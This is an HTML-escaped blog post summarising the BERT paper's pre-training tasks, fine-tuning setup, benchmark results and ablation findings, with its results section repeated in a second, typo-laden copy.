  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/model.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/model.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;h3 id=&#34;input-output-representations&#34;&gt;Input-Output Representations&lt;/h3&gt;
&lt;p&gt;BERT uses WordPiece embeddings with a 30,000 token vocabulary. The first token of every sequence is ([CLS]). The final hidden state corresponding to the [CLS] token is used as the aggregate sequence representation.&lt;br&gt;
To deal with sentence pairs, BERT uses a special token [SEP] to separate the two sentences. A learned embedding is added to every token indicating whether it is the first or the second sentence. The input embedding for each token is obtained by adding the corresponding token embedding (WordPiece embedding), segment embedding (first / second sentence) and position embedding (as in Transformers).&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/inputembeds.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/inputembeds.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;h3 id=&#34;bert-pre-training&#34;&gt;BERT pre-training&lt;/h3&gt;
&lt;p&gt;BERT is pre-trained using two unsupervised tasks.&lt;/p&gt;
&lt;h4 id=&#34;masked-lm&#34;&gt;Masked LM&lt;/h4&gt;
&lt;p&gt;The bidirectional model is more powerful than either a left-to-right model or the shallow concatenation of a left-to-right and right-to-left model.&lt;br&gt;
In order to train a deep bidirectional representation, some percentage (15% in the paper) of the input tokens are masked at random, and those masked tokens are predicted using an output softmax over the vocabulary. This is called a masked LM. The masking is performed by replacing the token with a [MASK] token. Now since the [MASK] token does not appear during fine-tuning, the [MASK] token is used 80% of the time. For 10% of the selected tokens (from the 15%) a random token is used to replace it and the token is kept unchanged for the rest 10%. The token is then predicted using cross-entropy loss.&lt;/p&gt;
&lt;h4 id=&#34;next-sentence-prediction-nsp&#34;&gt;Next Sentence Prediction (NSP)&lt;/h4&gt;
&lt;p&gt;To understand the relationship between two sentences (which is not captured by language modelling), a binarized NSP task is formulated. Here, when choosing the sentences A and B (refer to the model pre-training figure above) for each pre-training example, 50% of the time B is the actual next sentence and the rest 50% of the time, a random sentence from the corpus is used. The vector C (without fine-tuning) is used for NSP. This is helpful for tasks like Question Answering and Natural Language Inference.&lt;/p&gt;
&lt;h4 id=&#34;pre-training-data&#34;&gt;Pre-training data&lt;/h4&gt;
&lt;p&gt;It is useful for BERT to use a document-level corpus rather than a shuffled sentence-level corpus. BERT 9as in the paper) uses the BookCorpus (800M words) and English Wikipedia (2500M words).&lt;/p&gt;
&lt;h3 id=&#34;fine-tuning-bert&#34;&gt;Fine-tuning BERT&lt;/h3&gt;
&lt;p&gt;Instead of independently encoding text (sentence) pairs and then applying bidirectional cross attention, BERT uses the Transformer model architecture&amp;rsquo;s self-attention mechanism. Encoding the concatenated text (sentence) pair with self-attention effectively incorporates bidirectional cross attention between the two sentences.&lt;/p&gt;
&lt;p&gt;The fine-tuning is performed for all the parameters and the task-specific inputs and outputs of the downstream task are plugged for fine-tuning.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A and B are the sentence pairs in case of paraphrasing&lt;/li&gt;
&lt;li&gt;A and B are hypothesis-premise pairs in the entailment task&lt;/li&gt;
&lt;li&gt;A and B are question-passage pairs in question answering&lt;/li&gt;
&lt;li&gt;A and B are the text and Φ in text classification or sequence tagging task&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;At the output, for the token-level tasks (sequence tagging, question answering), the token representations are fed into the output layer. For the sentence-level tasks, the representation of the [CLS] token is fed to the output layer for classification.&lt;/p&gt;
&lt;hr&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;hr&gt;
&lt;h2 id=&#34;results&#34;&gt;Results&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;GLUE&lt;/strong&gt; - The General Language Understanding Evaluation benchmark is a collection of a number of diverse NLP tasks. The 8 datasets the paper evaluates on, are shown below. For these tasks, the [CLS] representation (hidden vector associated with it) is used. The classification layer (a single layer is used) and its weights are the only new parameters introduced. Standard log softmax loss is used.
The model used a batch size of 32 and was fine-tuned for 3 epochs. The learning rate was chosen from a list based on performance on the validation set.
BERT&lt;sub&gt;LARGE&lt;/sub&gt; was unstable on small datasets so random restarts were done with data shuffling and classification layer initialization. It was found that BERT&lt;sub&gt;LARGE&lt;/sub&gt; significantly outperforms BERT&lt;sub&gt;BASE&lt;/sub&gt; (and all other models) across all tasks, especially those with very little training data.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/glue.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/glue.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;SQuAD v1.1&lt;/strong&gt; - A collection of 100k question-answer pairs. Given a question and a passage, the task is to predict the answer span in the text. The question and the passage are represented using A and B embedding respectively. A start vector S and end vector E is introduced in the output. The probability of token &lt;em&gt;i&lt;/em&gt; being the start of the answer is given as&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/start.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/start.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;and similarly for the end token. The score of a candidate span from position &lt;em&gt;i&lt;/em&gt; to position &lt;em&gt;j&lt;/em&gt; is decided to be -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/etend.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/etend.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;This objective is maximised to get the answer range. 
Batch size of 32, learning rate of 5e-5 was used and the model was fine-tuned for 3 epochs. 
Also, for enhanced performance, a prior fine-tuning on the Trivia-QA dataset was done before the fine-tuning on SQuAD.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/squad1.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/squad1.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;SQuAD v2.0&lt;/strong&gt; - This task allows for the possibility of no short answer existing in the passage for the question, to present a more realistic situation. So, in this case, for the questions which don&amp;rsquo;t have an answer, the start and end is set to be the [CLS] token. So, now there is also a s&lt;sub&gt;null&lt;/sub&gt; = S•C + E•C as the no-answer span score. 
For a non-null answer, a s&lt;sub&gt;i,j&lt;/sub&gt; = S•T&lt;sub&gt;i&lt;/sub&gt; + E•T&lt;sub&gt;j&lt;/sub&gt; is defined. A non-null answer is predicted when s&lt;sub&gt;i,j&lt;/sub&gt; &amp;gt; s&lt;sub&gt;null&lt;/sub&gt; + τ. τ is decided on the basis of the performance of the model on the validation set. TriviaQA data was not used for this model. The model was fine-tuned for 2 epochs with a learning rate of 5e-5 and a batch size of 48.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/squad2.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/squad2.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;SWAG&lt;/strong&gt; - The Situations With Adversarial Generations (SWAG) dataset contains 113k sentence-pair completion examples that evaluate grounded commonsense inference. Given a sentence, the task is to choose the most correct continuation of the sentence among four choices. Scoring is performed for the four sentence pairs, the given sentence A and the possible continuation B. Here a vector is introduced whose dot product with the [CLS] token representation C denotes the score for each of the four choices and a softmax layer is used to get the probability distribution. The model was fine-tuned for 3 epochs with a learning rate of 2e-5 and a batch size of 16.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/swag.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/swag.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Key points from the analysis/ablation studies section -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Two additional modes of pre-training were performed.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;No NSP&lt;/strong&gt; - The model is pre-trained with mask LM but not with the NSP task.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;LTR and No NSP&lt;/strong&gt; - Instead of a masked LM, a standard left-to-right LM is used and the NSP task is again not performed.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The LTR model performs worse than the MLM model on all tasks, with large drops on MRPC and SQuAD.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;An LTR model performs poorly on token predictions and hence doesn&amp;rsquo;t perform well on SQuAD.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For strengthening the LTR models, a randomly initialized BiLSTM model is added on the top. This improves the results on SQuAD but does not perform well on the GLUE tasks.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Separately training LTR (left-to-right) and RTL (right-to-left) models and concatenating them for the token representations is an approach similar to ELMo. But the authors mention that this is twice as expensive as a single bidirectional model. Also, this is unintuitive for tasks like Question Answering since the RTL model would not be able to condition the answer on the question. Furthermore, it is less powerful than a deep bidirectional model, since it can use both left and right context at every layer.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/ablation1.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/ablation1.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;BERT&lt;sub&gt;BASE&lt;/sub&gt; contains 110M parameters and BERT&lt;sub&gt;LARGE&lt;/sub&gt; contains 340M parameters.&lt;/li&gt;
&lt;li&gt;Larger models lead to a strict accuracy improvement across all four datasets, even for MRPC (paraphrasing) which only has 3,600 labelled training examples.&lt;/li&gt;
&lt;li&gt;BERT claims to be the first model to demonstrate convincingly
that scaling to extreme model sizes also leads to large improvements on very small scale tasks, provided that the model has been sufficiently pre-trained.&lt;/li&gt;
&lt;li&gt;When the model is fine-tuned directly on the downstream task and uses only a very small number of randomly initialized additional parameters, the task-specific models can benefit from the larger, more expressive pre-trained representations even when downstream task data is very small.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/ablation2.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/ablation2.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;The feature-based model, in which fixed features are obtained from the model, has some advantages. Firstly, not all tasks can be modelled using a Transformer encoder and require task-specific model architecture to be added.&lt;/li&gt;
&lt;li&gt;Secondly, pre-computing the expensive representations and using them for multiple experiments with cheaper models is a computational benefit.&lt;/li&gt;
&lt;li&gt;The authors compare the feature-based approach for the BERT inference and the normal BERT for the NER task. In the inference part of the feature-based approach, the activations from one or more layers are taken &lt;em&gt;without&lt;/em&gt; any fine-tuning of the BERT parameters for the NER task. These contextual embeddings are used as input to a randomly initialized two-layer 768-dimensional BiLSTM before the classification layer.&lt;/li&gt;
&lt;li&gt;Although this does not perform better than the fine-tuned approach, the best performing method used the concatenation of the last four hidden layers&amp;rsquo; representation of the pre-trained Transformer as the token representation is only 0.3 F1 behind the fine-tuning approach. So, the authors conclude that BERT is effective for both fine-tuning and feature-based approaches.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/ablation3.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/ablation3.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;hr&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;hr&gt;
&lt;h2 id=&#34;results-1&#34;&gt;Results&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;GLUE&lt;/strong&gt; - The General Language Understanding Evaluation benchamrk is a collection of a number of diverse NLP tasks. The 8 datasets the paper evaluates on, are shown below. For these tasks, the [CLS] representation (hidden vector associated with it) is used. The classification layer (a single layer is used) and its weights are the only new parameters introduced. Standard log softmax loss is used.
Model used batch size of 32 and was fine tuned for 3 epochs. Learning rate was chosen from a list based on performance on validation set.
BERT&lt;sub&gt;LARGE&lt;/sub&gt; was unstable on small datasets so random restarts were done with data shuffling and classification layer initialization. It was found that BERT&lt;sub&gt;LARGE&lt;/sub&gt; significantly outperforms BERT&lt;sub&gt;BASE&lt;/sub&gt; (and all other models) across all tasks, especially those with very little training data.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/glue.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/glue.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;SQuAD v1.1&lt;/strong&gt; - A collection of 100k question-answer pairs. Given a question and a passage, the task is to predict the answer span in the text. The question and the passage are represneted using A and B embedding respectively. A start vector S and end vector E is introduced in the output. The probability of token &lt;em&gt;i&lt;/em&gt; being the start of the answer is given as&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/start.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/start.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;and similarly for the end token. The score of a candidate span form position &lt;em&gt;i&lt;/em&gt; to position &lt;em&gt;j&lt;/em&gt; is decided to be -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/etend.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/etend.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;This objective is maximised to get the answer range. 
Batch size of 32, learning rate of 5e-5 was used and the model was fine-tuned for 3 epochs. 
Also, for enhanced performance, a prior fine-tunig on the Trivia-QA dataset was done before the fine-tuning on SQuAD.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/squad1.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/squad1.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;SQuAD v2.0&lt;/strong&gt; - Thsi task allows for the possibilty of no short answer existing in the passage for the question, to present a more realistic situation. So, in this case, for the questions which don&amp;rsquo;t have a answer, the start and end is set to be the [CLS] token. So, now there is also a s&lt;sub&gt;null&lt;/sub&gt; = S•C + E•C as the no-answer span score. 
For a non-null answer, a s&lt;sub&gt;i,j&lt;/sub&gt; = S•T&lt;sub&gt;i&lt;/sub&gt; + E•T&lt;sub&gt;j&lt;/sub&gt; is defined. A non-null answer is predicted when s&lt;sub&gt;i,j&lt;/sub&gt; &amp;gt; s&lt;sub&gt;null&lt;/sub&gt; + τ. τ is decided on the basis of the performance of the model on the validation set. TriviaQA data was not used for this model. The model was fine-tuned for 2 epochs with a learning rate of 5e-5 and a batch size of 48.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/squad2.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/squad2.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;SWAG&lt;/strong&gt; - The Situations With Adversarial Generations (SWAG) dataset contains 113k sentence-pair completion examples that evaluate grounded commonsense inference. Given a sentence, the task is to choose the most correct continuation of the sentence among four choices. A scoring is performed for the four sentence pairs, the given sentence A and the possible continuation B. Here a vector is introduiced whose dot product with the [CLS] token representation C denotes the score for each of the four choices and a softmax layer is used to get the probabilty distribution. The model was fine-tuned for 3 epochs with a learning rate of 2e-5 and a batch size of 16.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/swag.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/swag.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Key points from the analysis/ablation studies section -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Two additional modes of pre-training were performed.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;No NSP&lt;/strong&gt; - The model is pre-trained with mask LM but not with the NSP task.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;LTR and No NSP&lt;/strong&gt; - Instead of a masked LM, a standard left-to-right LM is used and the NSP task is again not performed.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The LTR model performs worse than the MLM model on all tasks, with large drops on MRPC and SQuAD.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;An LTR model perofrms poorly on token predictions, and hence doesn&amp;rsquo;t perform well on SQuAD.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For strengthening the LTR models, a randomly initialized BiLSTM model is added on the top. This improves the results on SQuAD but does not perform well on the GLUE tasks.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Separately training LTR (left-to-right) and RTL (right-to-left) models and concatenating them for the token representations is an approach similar to ELMo. But the authors mention that this is twice as expensive as a single bidirectional model. Also, this is unintuitve for tasks like Question Answering since the RTL model would not be able to condition the answer on the question. Furthermore, it is less powerful than a deep bidirectional model, since it can use both left and right context at every layer.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/ablation1.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/ablation1.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;BERT&lt;sub&gt;BASE&lt;/sub&gt; contains 110M parameters and BERT&lt;sub&gt;LARGE&lt;/sub&gt; contains 340M parameters.&lt;/li&gt;
&lt;li&gt;Larger models lead to a strict accuracy improvement across all four datasets, even for MRPC (paraphrasing) which only has 3,600 labeled training examples.&lt;/li&gt;
&lt;li&gt;BERT claims to be the first model to demonstrate convincingly
that scaling to extreme model sizes also leads to large improvements on very small scale tasks, provided that the model has been sufficiently pre-trained.&lt;/li&gt;
&lt;li&gt;When the model is fine-tuned directly on the downstream task and uses only a very small number of randomly initialized additional parameters,the task specific models can benefit from the larger, more expressive pre-trained representations even when downstream task data is very small.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/ablation2.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/ablation2.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;The feature based model, in which fixed features are obtainned from the model, has some advantages. Firstly, not all tasks can be modeled using a Transformer encoder and require task-specific model architecture to be added.&lt;/li&gt;
&lt;li&gt;Secondly, pre-computing the expensive representations and using them for multiple experiments with cheaper models is a computational benefit.&lt;/li&gt;
&lt;li&gt;The authors compare the feature-based approach for the BERT inference and the normal BERT for the NER task. In the inference part of the feature-based aapproach the activations from one or more layers are taken &lt;em&gt;without&lt;/em&gt; any fine-tuning of the BERT paramaetrs for the NER task. These contextual embeddings are used as input to a randomly initialized a two-layer 768-dimensional BiLSTM before the classification layer.&lt;/li&gt;
&lt;li&gt;Although this does not perform better than the the fine-tuned approach, but the best performing method which used the concatenation of the last four hidden layers&amp;rsquo; representaion of the pre-trained Transformer as the token represnetation is only 0.3 F1 behind the fine-tuning approach. So, the authors conclude that BERT is effective for both fine-tunign and feature-based approaches.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/ablation3.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/images/ablation3.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;I have also released an annotated version of the paper. If you are interested, you can find it &lt;a href=&#34;https://github.com/shreyansh26/Annotated-ML-Papers/blob/main/BERT.pdf&#34;&gt;here&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is all for now!&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script data-name=&#34;BMC-Widget&#34; data-cfasync=&#34;false&#34; src=&#34;https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js&#34; data-id=&#34;shreyanshsingh&#34; data-description=&#34;Support me on Buy me a coffee!&#34; data-message=&#34;&#34; data-color=&#34;#FF5F5F&#34; data-position=&#34;Right&#34; data-x_margin=&#34;18&#34; data-y_margin=&#34;18&#34;&gt;&lt;/script&gt;
